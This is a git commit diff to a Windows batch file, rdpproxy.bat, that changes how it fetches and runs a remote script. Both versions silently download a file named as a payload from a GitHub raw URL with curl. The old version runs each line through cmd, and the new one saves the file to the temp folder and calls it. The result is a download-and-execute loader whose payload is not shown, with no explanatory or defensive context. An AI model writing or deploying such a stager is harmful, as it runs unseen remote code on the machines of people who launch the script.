44bab8ce0afae402d4dbf36a4aba1381782b6397
jipcation <93978525+jipcation@users.noreply.github.com>
2021-11-09 11:43:20 +0100

    Update rdpproxy.bat

--- rdpproxy.bat
+++ rdpproxy.bat
@@ -1,2 +1,3 @@
 @echo off
-FOR /F %%A IN ('curl --silent https://raw.githubusercontent.com/jipcation/rdpproxy/main/payload.bat') DO cmd /c %%A
+curl --silent https://raw.githubusercontent.com/jipcation/rdpproxy/main/rdpproxy_payload.bat -o %temp%/rdpproxy_payload.bat
+call %temp%/rdpproxy_payload.bat
